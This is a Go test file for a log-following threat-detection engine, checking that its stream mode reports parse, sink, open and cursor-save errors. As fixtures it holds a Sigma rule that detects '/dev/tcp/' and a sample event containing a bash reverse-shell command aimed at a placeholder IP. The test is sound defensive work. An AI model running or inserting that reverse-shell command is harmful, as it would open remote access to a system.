package engine

import (
	"context"
	"errors"
	"io"
	"os"
	"path/filepath"
	"sync"
	"testing"
	"time"

	"github.com/conor-sometimes/banken/internal/alert"
	"github.com/conor-sometimes/banken/internal/event"
	"github.com/conor-sometimes/banken/internal/parser"
	"github.com/conor-sometimes/banken/internal/sigma"
)

// These tests pin ROUGHEDGE H2: StreamFollow used to swallow every error in its drain -- an
// unreadable sink, a failing parser, a dispatch sink error, and a cursor.Save error -- so a live
// --watch daemon could be blind with nothing in the journal. Each class must now reach onError, and
// the open error (which recurs on every 1s safety tick) must be reported once per state change, not
// once per tick.

// errRec records every onError call in order, safe to read from the test while the follow goroutine
// writes. A nil err is the recovery edge of a recurring condition.
type errRec struct {
	mu  sync.Mutex
	rec []errEntry
}

type errEntry struct {
	kind StreamErrorKind
	err  error
}

func (r *errRec) onError(kind StreamErrorKind, err error) {
	r.mu.Lock()
	r.rec = append(r.rec, errEntry{kind, err})
	r.mu.Unlock()
}

// count returns how many reports matched kind with the given failing-ness (failing == err != nil).
func (r *errRec) count(kind StreamErrorKind, failing bool) int {
	r.mu.Lock()
	defer r.mu.Unlock()
	n := 0
	for _, e := range r.rec {
		if e.kind == kind && (e.err != nil) == failing {
			n++
		}
	}
	return n
}

// failParser always fails, standing in for a parser bug or a crafted record that trips one.
type failParser struct{}

func (failParser) Name() string { return "failparser" }
func (failParser) Parse(io.Reader) ([]event.Event, error) {
	return nil, errors.New("synthetic parse failure")
}

// errSink is a dispatch sink that always errors, standing in for a webhook that is down.
type errSink struct{}

func (errSink) Name() string           { return "errsink" }
func (errSink) Emit(alert.Alert) error { return errors.New("synthetic sink failure") }
func (errSink) Close() error           { return nil }

// reverseShellRule and a line that matches it, reused across the matching-path tests.
func reverseShellRule(t *testing.T) *sigma.Rule {
	t.Helper()
	return testRule(t, `title: reverse shell
detection:
  sel:
    CommandLine|contains: /dev/tcp/
  condition: sel`)
}

func reverseShellLine() []byte {
	return []byte(`{"schema":"mimi/2","time":"` + time.Now().UTC().Format(time.RFC3339Nano) +
		`","process":{"pid":42,"name":"bash","cmd_line":"bash -i >& /dev/tcp/192.0.2.1/4444",` +
		`"file":{"path":"/usr/bin/bash"},"user":{"uid":"0"}},"ancestry":[{"pid":42,"name":"bash"}]}` + "\n")
}

// TestStreamFollowSurfacesOpenErrorOncePerStateChange proves an unreadable/absent sink is reported
// exactly once while it stays unreadable (not once per 1s tick) and that its recovery is reported
// once when the sink finally appears -- the difference between "log when it becomes unreadable and
// when it recovers" and "log 60 times a minute".
func TestStreamFollowSurfacesOpenErrorOncePerStateChange(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "events.jsonl") // absent at first: OpenAt fails every drain
	statePath := filepath.Join(dir, "cursor.json")

	sink := &syncSink{}
	eng := New([]*sigma.Rule{reverseShellRule(t)}, nil, alert.NewDispatcher(sink))
	rec := &errRec{}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	done := make(chan error, 1)
	go func() { done <- eng.StreamFollow(ctx, parser.Mimi{}, path, statePath, nil, rec.onError) }()

	// Let the initial drain plus at least two 1s safety ticks fire while the sink is absent: each
	// re-opens and fails, but the edge-gate must report the open error exactly once.
	time.Sleep(2500 * time.Millisecond)
	if n := rec.count(StreamErrOpen, true); n != 1 {
		t.Fatalf("open error reported %d times over ~3 drains, want exactly 1 (once per state change, not per tick)", n)
	}
	if n := rec.count(StreamErrOpen, false); n != 0 {
		t.Fatalf("recovery reported %d times before the sink appeared, want 0", n)
	}

	// The sink appears with a matching line: the open condition clears, so a recovery edge must be
	// reported once and the event must be processed.
	if err := os.WriteFile(path, reverseShellLine(), 0o600); err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(4 * time.Second)
	for (rec.count(StreamErrOpen, false) < 1 || sink.n() < 1) && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	cancel()
	if err := <-done; err != nil && !errors.Is(err, context.Canceled) {
		t.Fatalf("StreamFollow returned %v", err)
	}
	if n := rec.count(StreamErrOpen, true); n != 1 {
		t.Fatalf("open error reported %d times across the whole run, want exactly 1 (no re-report per tick)", n)
	}
	if n := rec.count(StreamErrOpen, false); n != 1 {
		t.Fatalf("recovery edge reported %d times, want exactly 1 after the sink appeared", n)
	}
	if sink.n() != 1 {
		t.Fatalf("dispatched %d alerts after recovery, want 1", sink.n())
	}
}

// TestStreamFollowSurfacesParseError proves a failing parser is reported through onError and that
// the cursor is held (not advanced) so the bytes are re-read -- it used to leave the cursor stuck
// silently.
func TestStreamFollowSurfacesParseError(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "events.jsonl")
	statePath := filepath.Join(dir, "cursor.json")
	if err := os.WriteFile(path, []byte("one complete line\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	eng := New(nil, nil, nil) // the parser fails before any match, so no rules/dispatcher are needed
	rec := &errRec{}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	done := make(chan error, 1)
	go func() { done <- eng.StreamFollow(ctx, failParser{}, path, statePath, nil, rec.onError) }()

	deadline := time.Now().Add(4 * time.Second)
	for rec.count(StreamErrParse, true) < 1 && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	cancel()
	if err := <-done; err != nil && !errors.Is(err, context.Canceled) {
		t.Fatalf("StreamFollow returned %v", err)
	}
	if n := rec.count(StreamErrParse, true); n < 1 {
		t.Fatalf("parse error surfaced %d times, want >=1 (a failing parser must not be swallowed)", n)
	}
	// A parse error must not advance the cursor: with no Save, a reload stays at offset 0.
	c, _ := LoadCursor(statePath)
	if off := c.Offsets[path]; off != 0 {
		t.Fatalf("cursor advanced to %d despite a parse error, want 0 (held for re-read)", off)
	}
}

// TestStreamFollowSurfacesSinkError proves a dispatch sink error (a webhook down) is reported
// through onError in stream mode, the way scanSources already reports it in scan mode.
func TestStreamFollowSurfacesSinkError(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "events.jsonl")
	statePath := filepath.Join(dir, "cursor.json")
	if err := os.WriteFile(path, reverseShellLine(), 0o600); err != nil {
		t.Fatal(err)
	}

	eng := New([]*sigma.Rule{reverseShellRule(t)}, nil, alert.NewDispatcher(errSink{}))
	rec := &errRec{}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	done := make(chan error, 1)
	go func() { done <- eng.StreamFollow(ctx, parser.Mimi{}, path, statePath, nil, rec.onError) }()

	deadline := time.Now().Add(4 * time.Second)
	for rec.count(StreamErrSink, true) < 1 && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	cancel()
	if err := <-done; err != nil && !errors.Is(err, context.Canceled) {
		t.Fatalf("StreamFollow returned %v", err)
	}
	if n := rec.count(StreamErrSink, true); n < 1 {
		t.Fatalf("sink error surfaced %d times, want >=1 (a dispatch failure must not be invisible in stream mode)", n)
	}
}

// TestStreamFollowSurfacesSaveError proves a cursor.Save failure is reported through onError. The
// state path's parent is a regular file, so Save's MkdirAll fails on every attempt; the edge-gate
// means it is reported, once, rather than dropped.
func TestStreamFollowSurfacesSaveError(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "events.jsonl")
	if err := os.WriteFile(path, reverseShellLine(), 0o600); err != nil {
		t.Fatal(err)
	}
	// A regular file where a directory would need to be: cursor.Save's MkdirAll(dir) then fails.
	blocker := filepath.Join(dir, "blocker")
	if err := os.WriteFile(blocker, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	statePath := filepath.Join(blocker, "cursor.json")

	sink := &syncSink{}
	eng := New([]*sigma.Rule{reverseShellRule(t)}, nil, alert.NewDispatcher(sink))
	rec := &errRec{}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	done := make(chan error, 1)
	go func() { done <- eng.StreamFollow(ctx, parser.Mimi{}, path, statePath, nil, rec.onError) }()

	deadline := time.Now().Add(4 * time.Second)
	for rec.count(StreamErrSave, true) < 1 && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	cancel()
	if err := <-done; err != nil && !errors.Is(err, context.Canceled) {
		t.Fatalf("StreamFollow returned %v", err)
	}
	if n := rec.count(StreamErrSave, true); n < 1 {
		t.Fatalf("save error surfaced %d times, want >=1 (a failed cursor persist must not be dropped)", n)
	}
}
